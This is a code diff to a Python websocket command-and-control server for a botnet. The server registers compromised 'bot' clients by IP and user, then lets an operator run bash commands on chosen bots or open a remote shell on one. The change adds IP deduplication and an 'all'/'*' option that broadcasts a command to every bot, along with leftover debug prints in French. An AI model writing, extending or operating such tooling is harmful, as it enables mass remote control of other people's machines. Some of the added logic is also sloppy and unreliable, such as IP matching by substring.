@@ -15,11 +15,22 @@ from websockets.exceptions import ConnectionClosedError
 
 
 logger = logging.getLogger(__name__)
+bot_length = 0
+
 
 CLI_OPTIONS = f'Enter: \n' \
     f'* "0" - to print bot clients collection\n' \
     f'* Indexes of clients separated by space to send bash command to\n' \
     f'* Index of one client to jump into bash (send "exit" for termination)\n'
+
+def isNotListed(ip, ip_list):
+    for listed_ip in ip_list:
+        if ip in str(listed_ip):
+            #print(f'Type listed_ip : {type(str(listed_ip))}')
+            #print(f'IP déjà listée : {ip} --->  {listed_ip}')
+            return False
+    return True
+
 
 
 class Context:
@@ -33,21 +44,31 @@ class Context:
         except Exception:
             return None
 
+
     async def add_bot(self, ws: WebSocketConn):
         # First the client sends logged in user
         user = await ws.recv()
         try:
+            id = len(self.bots) + 1
             remote_adr, _ = ws.remote_address
             new_bot = Bot(
-                Id.next(),
+                id,
                 remote_adr,
                 ws,
                 user.strip("\n") if user else "--unknown--"
             )
-
-            self.bots.append(new_bot)
-            logger.info(f"Added {new_bot}")
-            return new_bot
+            if isNotListed(new_bot.remote_address, self.bots):
+                global bot_length
+                self.bots.append(new_bot)
+                logger.info(f"Added {new_bot}")
+                bot_length +=1 
+                #print(f"self.bots[0] : {self.bots[0]}")
+                #print(f"self.bots : {self.bots}")
+                #print(f'new_bot : {new_bot}')
+                #print(f'new_bot.remote_address : {new_bot.remote_address}')
+                #print(f"self.bots[0].__str__ : {self.bots[0].__str__}")
+                #print(f'self.bots[0].remote_address : {self.bots[0].remote_address}')
+                return new_bot
 
         except Exception as e:
             logger.error(f"Exception {e} during adding new bot client")
@@ -79,13 +100,13 @@ class CommandControl:
             logger.info(f"Bot client {ws.remote_address} not authenticated")
             await ws.close()
             return
-
         bot = await self.ctx.add_bot(ws)
         if bot:
             await ws.keepalive_ping()
             self.ctx.remove_bot_client(bot)
 
     async def execute_commands(self, ws: WebSocketConn, idxs: List[int]):
+        global bot_length
         await ws.send("Enter command:")
         cmd = await ws.recv()
 
@@ -106,6 +127,9 @@ class CommandControl:
 
         # Execute all commands simultaneously in case it takes long time to
         # finish
+        print(f'Longueur de la chaine : {len(idxs)}')
+        print(f'Contenu de la chaine : {idxs}')
+        print(f'Test de print de la longueur des bots : {bot_length}')
         await asyncio.gather(*[exec_command(i) for i in idxs])
 
     async def start_bash(self, ws: WebSocketConn, bot_idx: int):
@@ -140,19 +164,21 @@ class CommandControl:
 
                 if choice == "0":
                     await cli_ws.send(self.ctx.get_database_summary())
-                    continue
 
                 # Validate the input
                 nums = choice.split(" ")
-                if any(filter(lambda x: not is_num(x), nums)):
+                print(f'nums : {nums}')
+                if 'all' in nums or '*' in nums:
+                    nums = list(range(1, bot_length + 1)) 
+                    await self.execute_commands(cli_ws, [int(x) for x in nums])
+                    continue
+                elif any(filter(lambda x: not is_num(x), nums)):
                     await cli_ws.send("Unknown input")
                     continue
-
                 # Start bash with this client
-                if len(nums) == 1 and nums[0]:
+                elif len(nums) == 1 and nums[0]:
                     await self.start_bash(cli_ws, int(nums[0]))
                     continue
-
                 # Execute commands
                 await self.execute_commands(cli_ws, [int(x) for x in nums])
         except ConnectionClosedError:
